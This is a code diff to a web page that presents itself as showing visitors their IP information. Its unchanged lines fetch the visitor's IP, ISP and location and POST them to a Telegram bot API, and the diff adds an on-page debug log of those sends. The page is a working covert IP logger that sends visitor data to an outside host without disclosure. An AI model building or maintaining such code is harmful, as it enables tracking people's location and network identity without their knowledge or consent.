@@ -16,6 +16,7 @@
         </div>
         <p id="loading" class="text-lg text-gray-600 animate-pulse">Loading your IP information...</p>
         <div id="error" class="text-red-600 mt-4 hidden"></div>
+        <div id="debug" class="bg-gray-100 p-4 mt-4 rounded-lg text-left text-sm text-gray-600"></div>
     </div>
 
     <script>
@@ -29,6 +30,13 @@
         const ipInfoElement = document.getElementById('ip-info');
         const loadingElement = document.getElementById('loading');
         const errorElement = document.getElementById('error');
+        const debugElement = document.getElementById('debug');
+
+        function debugLog(message) {
+            const log = document.createElement('p');
+            log.textContent = message;
+            debugElement.appendChild(log);
+        }
 
         fetch(ipApiURL)
             .then(response => response.json())
@@ -46,7 +54,7 @@
 
                 const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;
 
-                console.log("Sending message to Telegram: ", message);
+                debugLog("Sending message to Telegram: " + message);
 
                 fetch(telegramApiURL, {
                     method: 'POST',
@@ -59,20 +67,20 @@
                     }),
                 })
                 .then(response => {
-                    console.log("Telegram API response status: ", response.status);
+                    debugLog("Telegram API response status: " + response.status);
                     return response.json();
                 })
                 .then(result => {
                     if (result.ok) {
-                        console.log('Message successfully sent to Telegram:', result);
+                        debugLog('Message successfully sent to Telegram.');
                     } else {
-                        console.error('Telegram API error response:', result);
+                        debugLog('Telegram API error response: ' + JSON.stringify(result));
                         errorElement.textContent = 'Failed to send message to Telegram.';
                         errorElement.classList.remove('hidden');
                     }
                 })
                 .catch(error => {
-                    console.error('Error sending message to Telegram:', error);
+                    debugLog('Error sending message to Telegram: ' + error);
                     errorElement.textContent = 'Error sending message to Telegram.';
                     errorElement.classList.remove('hidden');
                 });
@@ -81,7 +89,7 @@
                 loadingElement.textContent = 'Failed to load IP information.';
                 errorElement.textContent = 'Error fetching IP info.';
                 errorElement.classList.remove('hidden');
-                console.error('Error fetching IP info:', error);
+                debugLog('Error fetching IP info: ' + error);
             });
     </script>
 </body>
